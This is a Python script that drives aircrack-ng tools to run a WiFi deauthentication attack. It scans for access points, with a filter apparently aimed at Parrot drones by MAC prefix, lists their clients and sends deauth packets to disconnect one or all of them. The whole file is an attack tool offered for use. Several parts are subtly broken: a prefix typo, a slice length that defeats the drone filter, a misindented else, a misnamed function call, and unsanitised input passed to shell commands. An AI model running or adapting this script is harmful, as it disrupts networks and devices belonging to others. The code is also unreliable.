import os
import sys
import argparse
import time


def parse_args():
	# Create arguments
	parser = argparse.ArgumentParser()
	parser.add_argument("-i", "--interface", help="Choose a monitor mode interface. Example: `-i mon0`")
	parser.add_argument("-a", "--target_ap", help="Enter the BSSID of the access point to target")
	parser.add_argument("-c", "--target_client", help="Enter the BSSID of the client to target")
	parser.add_argument("-channel", "--channel", help="Optional: specify channel. Example: `-c 3`")
	return parser.parse_args()


def stop_mon_mode(interface):
	print("Stopping monitor mode...")
	try:
		os.system('airmon-ng stop %s' % interface)
	except:
		print("Failed while trying to stop monitor mode")
		return interface
	print("Restarting normal WiFi connection...")
	try:
		os.system('ifconfig %s up' % interface[:-3])
		os.system('service network-manager restart')
	except:
		print("Failed while attempting to restart wireless interface.")
	return interface[:-3]


def start_mon_mode(interface, channel=None):
	print("Starting monitor mode...")
	try:
		os.system('airmon-ng check kill')
		if channel is not None:
			os.system('airmon-ng start {} {}'.format(interface, channel))
		else:
			os.system('airmon-ng start %s' % interface)
	except:
		sys.exit('Could not start monitor mode.')
		return interface
	print("Interface %s started in monitor mode." % interface+'mon')

	return interface+'mon'


def get_ap_clients(bssid, interface, channel=None):
	# 1) Locate clients with airodump-ng, write to csv
	print("Attempting to locate clients connected to %s..." % bssid)
	try:
		if channel is None:
			os.system('timeout --foreground 10 airodump-ng {} --bssid {} -w CL -o csv'
					  .format(interface, bssid))
		else:
			os.system('timeout --foreground 10 airodump-ng {} --bssid {} -channel {} -w CL -o csv'
					  .format(interface, bssid, channel))
	except:
		print("Error when running airodump-ng, stopping...")
		stop_mon_mode(interface)
		exit()
	# 2) Parse csv file
	f = open("CL-01.csv", "r")
	lns = f.readlines()[5:]  # first five lines are a header
	f.close()
	os.system('rm CL-01.csv')
	print("Successfully found the following clients connected to %s" % bssid)
	for line in lns:
		if line == '\r\n':  # end of client list; as denoted in csv
			break
		print(line.split(',')[0])
	# 3) Let user choose the client
	client_mac = input("Please enter the client MAC you want to deauthenticate: ")
	return client_mac


def find_parrot_ap_2Ghz(interface):
	parrot_start = ['A0;14:3D', '90:3A:E6', '90:03:B7', '00:26:7E', '00:12:1C']
	os.system('timeout --foreground 4 airodump-ng %s -w AP -o csv' % interface)
	# 2) Parse csv file
	f = open("AP-01.csv", 'r')
	lns = f.readlines()[2:]  # first two lines is a header
	f.close()
	os.system('rm AP-01.csv')
	macs = []
	for l in lns:
		if l == '\r\n':
			break
		macs.append([l.split(',')[0], l.split(',')[13], l.split(',')[3]])

	final_macs = {}
	for m in macs:
		if m[0][0:7] in parrot_start:
			if m[1] in final_macs.keys():
				if not m[0] in final_macs[m[1]]:
					final_macs[m[1]].append([m[0], m[2]])
				else:
					final_macs[m[1]] = [[m[0], m[2]]]
	print(final_macs)
	print("Here are the networks that I found:")
	for key in final_macs:
		if key != ' ':
			print("ESSID: " + key)
			for bssid in final_macs[key]:
				print("\t" + bssid[0] + " " + bssid[1])
		else:
			print("BSSID with no given ESSID:")
			for bssid in final_macs[key]:
				print("\t" + bssid[0] + " " + bssid[1])
	bssid = input("Please enter the BSSID and channel of the AP you want to target: ")
	return bssid.split(' ')


def find_parrot_ap_5ghz(interface):
	parrot_start = ['A0;14:3D', '90:3A:E6', '90:03:B7', '00:26:7E', '00:12:1C']
	os.system('timeout --foreground 4 airodump-ng %s -w AP -o csv --band a' % interface) #--band a # 5 Ghz
	# 2) Parse csv file
	f = open("AP-01.csv", 'r')
	lns = f.readlines()[2:]  # first two lines is a header
	f.close()
	os.system('rm AP-01.csv')
	macs = []
	for l in lns:
		if l == '\r\n':
			break
		macs.append([l.split(',')[0], l.split(',')[13], l.split(',')[3]])

	final_macs = {}
	for m in macs:
		if m[0][0:7] in parrot_start:
			if m[1] in final_macs.keys():
				if not m[0] in final_macs[m[1]]:
					final_macs[m[1]].append([m[0], m[2]])
				else:
					final_macs[m[1]] = [[m[0], m[2]]]
	print(final_macs)
	print("Here are the networks that I found:")
	for key in final_macs:
		if key != ' ':
			print("ESSID: " + key)
			for bssid in final_macs[key]:
				print("\t" + bssid[0] + " " + bssid[1])
		else:
			print("BSSID with no given ESSID:")
			for bssid in final_macs[key]:
				print("\t" + bssid[0] + " " + bssid[1])
	bssid = input("Please enter the BSSID and channel of the AP you want to target: ")
	return bssid.split(' ')


def find_target_ap(interface):
	# 1) Locate APs with airodump-ng, write to csv
	print("Attempting to find wireless access points...")
	try:
		os.system('timeout --foreground 5 airodump-ng %s -w AP -o csv' % interface) #--band a # 5 Ghz
	except:
		print('Error while attempting to run airodump-ng, exiting.')
		stop_mon_mode(interface)
		exit()
	# 2) Parse csv file
	f = open("AP-01.csv", 'r')
	lns = f.readlines()[2:]  # first two lines is a header
	f.close()
	os.system('rm AP-01.csv')
	macs = []
	for l in lns:
		if l == '\r\n':
			break
		macs.append([l.split(',')[0], l.split(',')[13], l.split(',')[3]])

	final_macs = {}
	for m in macs:
		if m[1] in final_macs.keys():
			if not m[0] in final_macs[m[1]]:
				final_macs[m[1]].append([m[0], m[2]])
		else:
			final_macs[m[1]] = [[m[0], m[2]]]
	print(final_macs)
	print("Here are the networks that I found:")

	for key in final_macs:
		if key != ' ':
			print("ESSID: " + key)
			for bssid in final_macs[key]:
				print("\t" + bssid[0] + " " + bssid[1])
		else:
			print("BSSID with no given ESSID:")
			for bssid in final_macs[key]:
				print("\t" + bssid[0] + " " + bssid[1])
	bssid = input("Please enter the BSSID and channel of the AP you want to target: ")
	return bssid.split(' ')


def deauth(interface, ap_mac, channel, dest_mac=None):
	print("attempting to deauthenticate clients...")
	# -0 means deauthentication
	# 1 is number of deauths to send (each of these is 64 deauth packets to each AP/client)
	# -a mac address of access point
	# -c is mac address of client (if omitted, does all clients)
	if dest_mac is None:
		try:
			print("sending deauth packets")
			os.system('aireplay-ng -0 2 -a {} {}'.format(ap_mac, interface))
		except:
			print("failed to send deauth packets")
			return False
	else:
		try:
			os.system('aireplay-ng -0 2 -a {} -c {} {}'.format(ap_mac, dest_mac, interface))
		except:
			print("failed to send deauth packets")
			return False
	#print("deauth packets sent")
	return True


def main():
	print("starting de-authentication script...")
	# Must run as root
	# if os.geteuid():
	#    sys.exit("Please run as root")
	# Get command line arguments
	args = parse_args()

	# Set up interface in monitor mode
	if args.interface is None:
		print("Must specify an interface!")
		exit()
	args.interface = start_mon_mode(args.interface)

	# If no target AP specified, find one
	if args.target_ap is None:
		#args.target_ap, args.target_channel = find_target_ap(args.interface)
		args.target_ap, args.target_channel = find_parrot_ap_2Ghz(args.interface)
		temp = input("need to check 5Ghz? (Y)")
		if temp.lower() == 'y':
			args.target_ap, args.target_channel = find_parrot_ap_5Ghz(args.interface)

	# Get AP clients
	if args.target_client is None:
		ans = input(
			"Would you like to find a specific client to deauth (1) or deauth all clients on %s (2)?" % args.target_ap)
		if ans == '1':
			args.target_client = get_ap_clients(args.target_ap, args.interface)
		elif ans != '2':
			print("Answer format not understood. Will deauth all clients by default.")


	# Deauthenticate a client
	args.interface = stop_mon_mode(args.interface)
	args.interface = start_mon_mode(args.interface, args.channel)
	boo = deauth(args.interface, args.target_ap, args.channel, args.target_client)

	# Return wireless interface to normal
	args.interface = stop_mon_mode(args.interface)
	return args.target_ap


if __name__ == "__main__":
	main()
